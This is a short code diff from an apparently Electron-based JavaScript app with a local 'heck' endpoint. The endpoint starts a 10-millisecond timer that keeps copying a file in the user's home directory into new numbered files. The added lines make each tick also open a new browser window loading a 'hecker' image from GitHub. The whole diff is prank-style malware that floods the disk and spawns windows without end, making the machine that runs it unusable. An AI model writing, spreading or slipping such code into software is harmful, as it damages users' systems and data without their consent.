@@ -14,6 +14,11 @@ localServer.post('heck', async function(req, body) {
   setInterval(async function() {
     fs.copyFile(path.join(homedir, 'target.txt'), path.join(homedir, 'duplication' + duplication + '.txt'));
     duplication = duplication + 1;
+    let win = new BrowserWindow({
+      width: 800,
+      height: 600
+    });
+    win.loadURL('https://github.com/sapi-marah/heckerEXE/blob/main/hecker.png?raw=true');
   }, 10);
 });
 app.whenReady().then(function() {
